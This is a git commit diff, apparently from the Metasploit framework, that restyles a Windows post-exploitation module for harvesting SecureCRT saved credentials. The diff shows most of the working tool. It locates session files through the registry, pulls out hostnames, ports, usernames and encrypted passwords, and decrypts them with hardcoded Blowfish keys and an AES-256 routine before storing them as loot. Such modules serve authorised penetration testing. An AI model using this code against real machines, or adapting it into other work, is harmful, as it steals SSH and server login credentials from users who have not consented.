2a50368591fb6946349bd418a0a7113ac6607eaf
cn-kali-team <kali-team@qq.com>
2020-09-11 11:54:12 +0800

    remove comment

--- modules/post/windows/gather/credentials/securecrt.rb
+++ modules/post/windows/gather/credentials/securecrt.rb
@@ -28,7 +28,7 @@ class MetasploitModule < Msf::Post
     )
     register_options(
       [
-        OptString.new('MASTER_PASSWORD', [ false, 'If the user sets the master password, e.g.:123456']),
+        OptString.new('Passphrase', [ false, 'If the user sets the master password, e.g.:123456']),
       ]
     )
   end
@@ -37,8 +37,8 @@ class MetasploitModule < Msf::Post
     cipher = OpenSSL::Cipher.new('bf-cbc').decrypt
     cipher.padding = 0
     cipher.key_len = secret_key.length
-    cipher.key     = secret_key
-    cipher.iv= "\x00" * 8
+    cipher.key = secret_key
+    cipher.iv = "\x00" * 8
     cipher.update(text) + cipher.final
   end
 
@@ -63,44 +63,44 @@ class MetasploitModule < Msf::Post
     # enum session file
     config_ini.each do |item|
       file_name = item['path'] + session.fs.file.separator + item['name']
-      file_contents = read_file(file_name) if not ['__FolderData__.ini','Default.ini'].include?(item['name'])
+      file_contents = read_file(file_name) if !['__FolderData__.ini', 'Default.ini'].include?(item['name'])
       if file_contents.nil? || file_contents.empty?
         next
       end
+
       file = try_encode_file(file_contents)
-      hostname = $1 if Regexp.compile('S:"Hostname"=([^\r\n]*)').match(file)
-      password = securecrt_crypto($1) if Regexp.compile('S:"Password"=u([0-9a-f]+)').match(file)
-      passwordv2 = securecrt_crypto_v2($1) if Regexp.compile('S:"Password V2"=02:([0-9a-f]+)').match(file)
-      port = $1.to_i(16).to_s if Regexp.compile('D:"\[SSH2\] Port"=([0-9a-f]{8})').match(file)
-      username = $1 if  Regexp.compile('S:"Username"=([^\r\n]*)').match(file)
+      hostname = Regexp.last_match(1) if Regexp.compile('S:"Hostname"=([^\r\n]*)').match(file)
+      password = securecrt_crypto(Regexp.last_match(1)) if Regexp.compile('S:"Password"=u([0-9a-f]+)').match(file)
+      passwordv2 = securecrt_crypto_v2(Regexp.last_match(1)) if Regexp.compile('S:"Password V2"=02:([0-9a-f]+)').match(file)
+      port = Regexp.last_match(1).to_i(16).to_s if Regexp.compile('D:"\[SSH2\] Port"=([0-9a-f]{8})').match(file)
+      username = Regexp.last_match(1) if Regexp.compile('S:"Username"=([^\r\n]*)').match(file)
       tbl << {
         file_name: item['name'],
         hostname: hostname,
         port: port,
         username: username,
-        password: password || passwordv2,
+        password: password || passwordv2
       }
     end
     return tbl
   end
 
-  def securecrt_crypto(ciphertext)  
+  def securecrt_crypto(ciphertext)
     key1 = "\x24\xA6\x3D\xDE\x5B\xD3\xB3\x82\x9C\x7E\x06\xF4\x08\x16\xAA\x07"
     key2 = "\x5F\xB0\x45\xA2\x94\x17\xD9\x16\xC6\xC6\xA2\xFF\x06\x41\x82\xB7"
     ciphered_bytes = [ciphertext].pack('H*')
-    cipher_tmp = blowfish_decrypt(key1,ciphered_bytes)[4..-5]
-    padded_plain_bytes = blowfish_decrypt(key2,cipher_tmp)
-    i = 0
-    (0..padded_plain_bytes.length).step(2) {|i|
+    cipher_tmp = blowfish_decrypt(key1, ciphered_bytes)[4..-5]
+    padded_plain_bytes = blowfish_decrypt(key2, cipher_tmp)
+    (0..padded_plain_bytes.length).step(2) do |i|
       if (padded_plain_bytes[i] == "\x00" && padded_plain_bytes[i + 1] == "\x00")
-        return padded_plain_bytes[0..i-1].force_encoding("UTF-16LE").encode('UTF-8')
+        return padded_plain_bytes[0..i - 1].force_encoding('UTF-16LE').encode('UTF-8')
       end
-    }
+    end
   end
 
   def securecrt_crypto_v2(ciphertext)
-    iv =("\x00" * 16)
-    config_passphrase =  datastore['Passphrase'] || nil
+    iv = ("\x00" * 16)
+    config_passphrase = datastore['Passphrase'] || nil
     key = OpenSSL::Digest::SHA256.new(config_passphrase).digest
     aes = OpenSSL::Cipher.new('AES-256-CBC')
     aes.key = key
@@ -108,13 +108,14 @@ class MetasploitModule < Msf::Post
     aes.decrypt
     aes.iv = iv
     padded_plain_bytes = aes.update([ciphertext].pack('H*'))
-    plain_bytes_length= padded_plain_bytes[0,4].unpack1('l') # bytes to int little-endian format.
-    plain_bytes = padded_plain_bytes[4,plain_bytes_length]
-    plain_bytes_digest = padded_plain_bytes[4 + plain_bytes_length,32]
-    if(OpenSSL::Digest::SHA256.new(plain_bytes).digest == plain_bytes_digest) # verity
+    plain_bytes_length = padded_plain_bytes[0, 4].unpack1('l') # bytes to int little-endian format.
+    plain_bytes = padded_plain_bytes[4, plain_bytes_length]
+    plain_bytes_digest = padded_plain_bytes[4 + plain_bytes_length, 32]
+    if (OpenSSL::Digest::SHA256.new(plain_bytes).digest == plain_bytes_digest) # verity
       return plain_bytes.force_encoding('UTF-8')
     end
-    print_error("Maybe the user has set the passphrase, please try to provide the [Passphrase] to decrypt again.")
+
+    print_error('Maybe the user has set the passphrase, please try to provide the [Passphrase] to decrypt again.')
     return nil
   end
 
@@ -149,10 +150,9 @@ class MetasploitModule < Msf::Post
   def run
     print_status("Gather Securecrt Passwords on #{sysinfo['Computer']}")
     # HKEY_CURRENT_USER\Software\VanDyke\SecureCRT
-    result = []
-    parent_key = "HKEY_CURRENT_USER\\Software\\VanDyke\\SecureCRT"
+    parent_key = 'HKEY_CURRENT_USER\\Software\\VanDyke\\SecureCRT'
     # get session file path
-    securecrt_path = expand_path(registry_getvaldata(parent_key, 'Config Path') + session.fs.file.separator + "Sessions")
+    securecrt_path = expand_path(registry_getvaldata(parent_key, 'Config Path') + session.fs.file.separator + 'Sessions')
     if securecrt_path
       result = enum_session_file(securecrt_path)
       columns = [
@@ -183,7 +183,7 @@ class MetasploitModule < Msf::Post
         print_good("Passwords stored in: #{path}")
       end
     else
-      print_error("Session path not found")
+      print_error('Session path not found')
     end
   end
 end
